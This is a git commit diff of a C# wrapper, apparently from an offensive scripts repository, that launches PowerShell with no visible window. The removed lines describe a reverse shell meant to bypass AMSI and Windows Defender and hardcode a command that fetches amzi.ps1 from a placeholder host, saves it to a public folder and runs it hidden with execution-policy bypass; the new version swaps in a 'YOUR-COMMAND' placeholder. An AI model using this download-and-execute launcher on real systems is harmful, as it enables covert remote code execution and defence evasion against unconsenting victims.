d90f396fda073b62725bfd0541588153427d5811
0iphor13 <79219148+0iphor13@users.noreply.github.com>
2021-10-16 15:53:02 +0200

    Update amzhell.cs

--- amzhell.cs
+++ amzhell.cs
@@ -1,7 +1,3 @@
-#Reverse shell by downloading amzi.ps1 and executing it in the background - Bypass AMSI & W10 Defender.
-#amzi.ps1 -> https://github.com/0iphor13/Scripts-and-Exploits/blob/main/amzi.ps1
-#Author: 0iphor13 
-
 using System;
 using System.Diagnostics;
 
@@ -9,7 +5,7 @@ namespace Wrapper{
     class Program{
         static void Main(){
             Process proc = new Process();
-	    ProcessStartInfo procInfo = new ProcessStartInfo("powershell.exe" , "wget 'http://0.0.0.0:8080/amzi.ps1' -o C:\\Users\\Public\\amzi.ps1;Start-Sleep 1;powershell -ep bypass -WindowStyle hidden C:\\Users\\Public\\amzi.ps1");
+	    ProcessStartInfo procInfo = new ProcessStartInfo("powershell.exe" , "YOUR-COMMAND");
 	    procInfo.CreateNoWindow = true;
 	    proc.StartInfo = procInfo;
             proc.Start();
